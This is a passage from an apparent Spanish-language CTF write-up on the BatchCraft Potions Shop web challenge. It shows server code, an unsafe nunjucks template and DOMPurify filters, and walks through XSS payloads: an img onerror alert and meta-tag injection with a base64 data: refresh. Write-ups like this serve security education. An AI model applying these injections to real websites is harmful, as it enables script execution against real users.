<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_seller </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username;</span>
<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_approved </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">addPotion</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">potion</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getAddedPotionID</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username);</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> bot.</span><span class="mtk8">previewProduct</span><span class="mtk1">(</span><span class="mtk1">potion</span><span class="mtk1">.id);</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Potion added and being reviewed by admin!'</span><span class="mtk1">));</span>  
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">});</span>
</code></pre></div><h2 id="ocasionando-un-xss">Ocasionando un XSS</h2><p>Aquí necesitamos ingresar muchos atributos del producto y <code>Joi</code> los verificará, que es otra librería actualizada. Luego, el <em>script</em> usa <code>FilterHelper.filterHtml</code> para sanitizar <code>value.product_desc</code>. De hecho, podemos echar un vistazo a las plantillas, esta es <code>views/product.html</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;!</span><span class="mtk5">DOCTYPE</span><span class="mtk1"> </span><span class="mtk8">html</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;</span><span class="mtk5">html</span><span class="mtk1"> </span><span class="mtk8">lang</span><span class="mtk1">=</span><span class="mtk4">"en"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"rpgui-cursor-default"</span><span class="mtk1">&gt;</span>
<span class="mtk1">  &lt;</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">charset</span><span class="mtk1">=</span><span class="mtk4">"utf-8"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"viewport"</span><span class="mtk1"> </span><span class="mtk8">content</span><span class="mtk1">=</span><span class="mtk4">"width=device-width, initial-scale=1, shrink-to-fi</span><span class="mtk4">t=no"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">title</span><span class="mtk1">&gt;BatchCraft Potions Shop&lt;/</span><span class="mtk5">title</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"author"</span><span class="mtk1"> </span><span class="mtk8">content</span><span class="mtk1">=</span><span class="mtk4">"rayhan0x01"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/vendors/base/vendor.bundle.base.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/css/bootstrap.min.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/vendors/rpgui/rpgui.min.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/css/carousel.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/css/site.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/css/product.css</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"shortcut icon"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/images/favicon.png</span><span class="mtk4">"</span><span class="mtk1"> /&gt;</span>
<span class="mtk1">    {{ meta </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">safe</span><span class="mtk1"> }}</span>
<span class="mtk1">  &lt;/</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
<span class="mtk1">  &lt;</span><span class="mtk5">body</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"rpgui-content"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"container reset-pos rpgui-container framed-golden</span><span class="mtk4">-2 shop-header-container"</span><span class="mtk1">&gt;</span>
<span class="mtk1">        &lt;</span><span class="mtk5">a</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"/"</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"goback"</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">img</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/images/goback.png</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">a</span><span class="mtk1">&gt;</span>
<span class="mtk1">        &lt;</span><span class="mtk5">p</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"shop-header"</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">span</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"mage"</span><span class="mtk1">&gt;🧙‍♀️&lt;/</span><span class="mtk5">span</span><span class="mtk1">&gt; BatchCraft Potions Shop &lt;</span><span class="mtk5">span</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"mage"</span><span class="mtk1">&gt;🧙&lt;/</span><span class="mtk5">span</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">p</span><span class="mtk1">&gt;</span>  
<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"container reset-pos rpgui-container framed potion</span><span class="mtk4">s-container"</span><span class="mtk1">&gt;</span>
<span class="mtk1">        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"row w-100 g-0"</span><span class="mtk1">&gt;</span>
<span class="mtk1">            &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col-5 text-center"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"potion-item"</span><span class="mtk1"> </span><span class="mtk8">data-category</span><span class="mtk1">=</span><span class="mtk4">"{{ </span><span class="mtk1">product</span><span class="mtk4">.</span><span class="mtk1">product_category</span><span class="mtk4"> }}"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">            &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">            &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col-7"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"reset-pos rpgui-container framed-golden-2 detail-</span><span class="mtk4">container"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                    &lt;</span><span class="mtk5">p</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"product-name"</span><span class="mtk1">&gt;{{ product.product_name }}&lt;/</span><span class="mtk5">p</span><span class="mtk1">&gt;</span>
<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"product-desc"</span><span class="mtk1">&gt;{{ product.product_desc </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">safe</span><span class="mtk1"> }}&lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"row w-100 g-0 action-row"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                            &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"product-price"</span><span class="mtk1">&gt;Price : $ {{ product.product_price }}&lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                            &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"product-quantity row g-0 w-100"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col mt-2"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                    Quantity :</span>
<span class="mtk1">                                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col quantity-select"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                    &lt;</span><span class="mtk5">select</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"rpgui-dropdown"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                        &lt;</span><span class="mtk5">option</span><span class="mtk1"> </span><span class="mtk8">value</span><span class="mtk1">=</span><span class="mtk4">"option1"</span><span class="mtk1">&gt;1&lt;/</span><span class="mtk5">option</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                        &lt;</span><span class="mtk5">option</span><span class="mtk1"> </span><span class="mtk8">value</span><span class="mtk1">=</span><span class="mtk4">"option2"</span><span class="mtk1">&gt;3&lt;/</span><span class="mtk5">option</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                        &lt;</span><span class="mtk5">option</span><span class="mtk1"> </span><span class="mtk8">value</span><span class="mtk1">=</span><span class="mtk4">"option2"</span><span class="mtk1">&gt;5&lt;/</span><span class="mtk5">option</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                    &lt;/</span><span class="mtk5">select</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                            &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"col justify-content-center align-items-center"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                            &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"product-purchase text-center"</span><span class="mtk1">&gt;</span>
<span class="mtk1">                                &lt;</span><span class="mtk5">button</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"rpgui-button"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"button"</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">p</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"pt-3"</span><span class="mtk1">&gt;Purchase&lt;/</span><span class="mtk5">p</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">button</span><span class="mtk1">&gt;</span>
<span class="mtk1">                            &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">            &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>

<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"container reset-pos rpgui-container framed-golden</span><span class="mtk4">-2"</span><span class="mtk1">&gt;</span>
<span class="mtk1">        &lt;</span><span class="mtk5">img</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/images/open.png</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"open-banner"</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"container reset-pos rpgui-container framed-golden</span><span class="mtk4">-2"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>

<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/jquery.min.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/vendors/rpgui/rpgui.min.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/global.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">    &lt;</span><span class="mtk5">script</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">/static/js/product.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
<span class="mtk1">  &lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
</code></pre></div><p>¿Ves algo raro? Sí, aparece <code>{{ product.product_desc | safe }}</code>, que le dice al motor de plantillas (<code>nunjucks</code>) que <code>product.product_desc</code> en realidad contiene código HTML seguro, por lo que el motor de plantillas no sanitizará el contenido.</p><h3 id="intentos-fallidos">Intentos fallidos</h3><p>Cuando vi por primera vez el código fuente, estaba seguro de que esto podría desencadenar un ataque de <em>Cross-Site Scripting</em> (XSS) en el navegador del <em>bot</em> que revisa nuestros productos. Cuando pasé la parte del OTP y llegué aquí, vi que <code>FilterHelper.filterHTML</code> estaba bloqueando mi estrategia de ataque:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">createDOMPurify</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'dompurify'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk8 mtku">JSDOM</span><span class="mtk1"> }       </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'jsdom'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">filterHTML</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">userHTML</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk1">window</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JSDOM</span><span class="mtk1">(</span><span class="mtk4">''</span><span class="mtk1">).</span><span class="mtk1">window</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">DOMPurify</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">createDOMPurify</span><span class="mtk1">(</span><span class="mtk1">window</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">DOMPurify</span><span class="mtk1">.</span><span class="mtk8">sanitize</span><span class="mtk1">(</span><span class="mtk9 mtki">userHTML</span><span class="mtk1">, {</span>
<span class="mtk1">        </span><span class="mtk1">ALLOWED_TAGS</span><span class="mtk1">: [</span><span class="mtk4">'strong'</span><span class="mtk1">, </span><span class="mtk4">'em'</span><span class="mtk1">, </span><span class="mtk4">'b'</span><span class="mtk1">, </span><span class="mtk4">'img'</span><span class="mtk1">, </span><span class="mtk4">'a'</span><span class="mtk1">, </span><span class="mtk4">'s'</span><span class="mtk1">, </span><span class="mtk4">'ul'</span><span class="mtk1">, </span><span class="mtk4">'ol'</span><span class="mtk1">, </span><span class="mtk4">'li'</span><span class="mtk1">]</span>
<span class="mtk1">    });</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">filterMeta</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">metaHTML</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk1">window</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JSDOM</span><span class="mtk1">(</span><span class="mtk4">''</span><span class="mtk1">).</span><span class="mtk1">window</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">DOMPurify</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">createDOMPurify</span><span class="mtk1">(</span><span class="mtk1">window</span><span class="mtk1">);</span>
<span class="mtk1">    sanitized </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">DOMPurify</span><span class="mtk1">.</span><span class="mtk8">sanitize</span><span class="mtk1">(</span><span class="mtk9 mtki">metaHTML</span><span class="mtk1">, {</span>
<span class="mtk1">        </span><span class="mtk1">ALLOWED_TAGS</span><span class="mtk1">: [</span><span class="mtk4">'meta'</span><span class="mtk1">],</span>
<span class="mtk1">        </span><span class="mtk1">ALLOWED_ATTR</span><span class="mtk1">: [</span><span class="mtk4">'name'</span><span class="mtk1">, </span><span class="mtk4">'content'</span><span class="mtk1">, </span><span class="mtk4">'property'</span><span class="mtk1">, </span><span class="mtk4">'http-equiv'</span><span class="mtk1">],</span>
<span class="mtk1">        </span><span class="mtk1">WHOLE_DOCUMENT</span><span class="mtk1">: </span><span class="mtk6">true</span>
<span class="mtk1">    });</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JSDOM</span><span class="mtk1">(sanitized).</span><span class="mtk1">window</span><span class="mtk1">.</span><span class="mtk1">document</span><span class="mtk1">.</span><span class="mtk7">head</span><span class="mtk1">.</span><span class="mtk1">innerHTML</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">generateMeta</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">title</span><span class="mtk1">, </span><span class="mtk9 mtki">description</span><span class="mtk1">, </span><span class="mtk9 mtki">keywords</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">filterMeta</span><span class="mtk1">(</span>
<span class="mtk1">    </span><span class="mtk4">`</span>
<span class="mtk4">        &lt;meta http-equiv="Content-Security-Policy"</span><span class="mtk4"> content="script-src 'self' 'unsafe-inline'"&gt;</span>  
<span class="mtk4">        &lt;meta property="og:title" content="</span><span class="mtk5">${</span><span class="mtk9 mtki">title</span><span class="mtk5">}</span><span class="mtk4">" /&gt;</span>
<span class="mtk4">        &lt;meta property="og:description" content="</span><span class="mtk5">${</span><span class="mtk9 mtki">description</span><span class="mtk5">}</span><span class="mtk4">" /&gt;</span>
<span class="mtk4">        &lt;meta name="keywords" content="</span><span class="mtk5">${</span><span class="mtk9 mtki">keywords</span><span class="mtk5">}</span><span class="mtk4">" /&gt;</span>
<span class="mtk4">    `</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">filterMeta</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8">filterHTML</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8">generateMeta</span>
<span class="mtk1">};</span>
</code></pre></div><p>Como puedes ver, <code>filterHTML</code> solo permite algunas etiquetas específicas. Una cosa buena es poder usar etiquetas <code>img</code>, ya que es suficiente para ocasionar un XSS. Sin embargo, <code>DOMPurify.sanitize</code> elimina cualquier contenido malicioso en HTML, por lo que no podemos usar el <em>payload</em> clásico de XSS:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">img</span><span class="mtk1"> </span><span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"x"</span><span class="mtk1"> </span><span class="mtk8">onerror</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk8">alert</span><span class="mtk4">(</span><span class="mtk6">123</span><span class="mtk4">)</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>  
</code></pre></div><p>Además, <code>dompurify</code> y <code>jsdom</code> están actualizados, por lo que no hay <em>exploits</em> disponibles para estos.</p><p>Pero también hay otras funciones como <code>generateMeta</code> y <code>filterMeta</code>. Se nos permite agregar contenido a etiquetas <code>meta</code>, y también inyectar más etiquetas <code>meta</code> si es necesario, porque podemos ingresar una comilla doble (<code>"</code>) y escapar del entorno <code>content="${variable}"</code>.</p><p>La función <code>filterMeta</code> solamente permite atributos <code>name</code>, <code>content</code>, <code>property</code> y <code>http-equiv</code> en las etiquetas <code>meta</code>. Hay una manera de ocasionar un XSS con etiquetas <code>meta</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">http-equiv</span><span class="mtk1">=</span><span class="mtk4">"refresh"</span><span class="mtk1"> </span><span class="mtk8">content</span><span class="mtk1">=</span><span class="mtk4">"0; data:text/html;base64,PHNjcmlwdD4gYWxlcnQoMTIzKSA8L3NjcmlwdD4K"</span><span class="mtk1">&gt;</span>  
</code></pre></div><p>Este <em>payload</em> refrescará la página web y accederá a la URL <code>data:</code>, que tiene un documento HTML embebido:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> PHNjcmlwdD4gYWxlcnQoMTIzKSA8L3NjcmlwdD4K | <span class="code-dark-green">base64</span> -d  
&lt;script&gt; alert(123) &lt;/script&gt;
</code></pre></div><p>En este punto, estaba seguro de que encontré la forma de obtener XSS en el <em>bot</em>. Por cierto, esto es <code>bot.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> puppeteer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'puppeteer'</span><span class="mtk1">);</span>
